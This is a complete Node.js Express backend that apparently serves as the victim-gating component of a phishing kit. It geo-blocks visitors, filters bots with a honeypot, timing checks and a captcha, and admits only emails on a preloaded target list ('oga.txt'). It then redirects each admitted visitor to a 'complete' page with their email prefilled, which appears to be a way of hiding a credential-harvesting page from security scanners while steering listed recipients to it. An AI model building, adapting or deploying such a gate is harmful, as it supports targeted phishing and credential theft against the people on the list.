require('dotenv').config();

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://yourdomain.com/complete';

// Allow/Block IP and Country
const ALLOWED_COUNTRIES = ['us', 'GB', 'CA', 'uk', 'FR'];
const BLOCKED_IPS = new Set(['192.0.2.1', '203.0.113.5']);

// Email rate limiter storage
const emailRateLimiter = new Map();
const MAX_EMAIL_ATTEMPTS = 5;
const EMAIL_WINDOW_MS = 10 * 60 * 1000; // 10 minutes

let validEmails = new Set();
function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded into memory');
  } catch (err) {
    console.error('[ERROR] Failed to read email list:', err);
  }
}
loadEmails();

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 20,
  message: { valid: false, message: 'Too many requests, try again later.' },
});

app.use(cors());
app.use(express.json());
app.use(limiter);

app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName, clientTimestamp } = req.body;
  const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
  const countryCode = req.headers['cf-ipcountry'] || 'XX';

  console.log(`[INFO] Request from IP ${clientIP}, Country ${countryCode}`);

  if (BLOCKED_IPS.has(clientIP)) {
    console.warn('[BLOCK] IP is blocked:', clientIP);
    return res.status(403).json({ valid: false, message: 'Access denied' });
  }
  if (!ALLOWED_COUNTRIES.includes(countryCode)) {
    console.warn('[BLOCK] Country not allowed:', countryCode);
    return res.status(403).json({ valid: false, message: 'Access from this region is restricted' });
  }

  // Honeypot detection
  if (middleName && middleName.trim() !== '') {
    console.warn('[BOT] Honeypot field triggered');
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  // Client-side timing protection
  const now = Date.now();
  const timeSinceLoad = now - (parseInt(clientTimestamp) || now);
  if (timeSinceLoad < 2000) {
    console.warn('[BOT] Too fast interaction detected');
    return res.status(429).json({ valid: false, message: 'Interaction too fast. Try again.' });
  }

  // Email format validation
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    console.warn('[WARN] Invalid or missing email attempt:', email);
    return res.status(400).json({ valid: false, message: 'Invalid or missing email format' });
  }

  // Rate limit by email
  const nowWindow = Date.now();
  const record = emailRateLimiter.get(email.toLowerCase()) || { count: 0, first: nowWindow };
  if (nowWindow - record.first < EMAIL_WINDOW_MS) {
    if (record.count >= MAX_EMAIL_ATTEMPTS) {
      return res.status(429).json({ valid: false, message: 'Too many attempts with this email. Try again later.' });
    }
    record.count++;
  } else {
    record.count = 1;
    record.first = nowWindow;
  }
  emailRateLimiter.set(email.toLowerCase(), record);

  // Captcha verification
  if (!captchaToken) {
    console.warn('[WARN] Missing captcha token attempt');
    return res.status(400).json({ valid: false, message: 'Captcha missing' });
  }

  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
    });
    const verifyData = await verifyRes.json();
    if (!verifyData.success) {
      console.warn('[WARN] Captcha verification failed:', verifyData);
      return res.status(400).json({ valid: false, message: 'Captcha failed. Please reload the page' });
    }
  } catch (err) {
    console.error('[ERROR] Captcha verification error:', err);
    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
  }

  const normalizedEmail = email.toLowerCase();
  const isValid = validEmails.has(normalizedEmail);
  console.log(`[INFO] Email verification result for ${email}: ${isValid}`);

  if (!isValid) {
    return res.status(404).json({ valid: false, message: 'Enter the valid recipient email to continue' });
  }

  const redirectUrl = `${REDIRECT_BASE}?email=${encodeURIComponent(normalizedEmail)}`;
  return res.json({ valid: true, message: 'Email verified', redirectUrl });
});

app.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
